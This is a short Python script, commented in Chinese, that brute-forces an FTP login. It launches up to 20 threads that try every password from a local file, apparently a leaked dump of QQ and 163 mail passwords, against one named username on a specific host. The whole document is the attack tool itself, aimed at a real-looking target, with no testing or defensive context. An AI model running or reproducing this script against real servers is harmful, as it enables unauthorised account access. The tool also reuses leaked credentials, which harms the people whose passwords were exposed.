# http://hk801.pc51.com/  破解FTP密码

'''
"user"
csdn  user用户名

密码字典  password

'''
import ftplib
import threading


def TestFTP(addr, user, password):
    with  sem:  # 锁定数量
        try:
            global isfind
            myftp = ftplib.FTP(addr)  # 登陆服务器
            if isfind:  # 找到退出循环
                return

            myftp.login(user, password)
            print(user, password, "------------------------------------密码正确")

            isfind = True
            return user + "#" + password
        except:
            print(user, password, "密码不正确")
            return ""


# 读取文件
sem = threading.Semaphore(20)  # 限制线程的最大数量为2个
isfind = False
file = open("Z:\\F\\第一阶段视频\\20170531\\NBdata\\qqAnd163Password.txt", "rb")
while True:
    if isfind:  # 找到退出循环
        break
    line = file.readline()  # 读取一行
    line = line.decode("gbk", "ignore")  # 转码
    linelist = line.split(" # ")
    if linelist[0] == "qq123456789":
        print("---------------------------------------------")
    # linelist[0] 密码
    # TestFTP("hk801.pc51.com", "qinghuabeidacn517", linelist[0])
    # list,批量管理
    threading.Thread(target=TestFTP, args=("hk801.pc51.com", "qinghuabeidacn517", linelist[0])).start()

    # print(line)
    if not line:
        break

# TestFTP("hk801.pc51.com","qinghuabeidacn517","qq123456789")
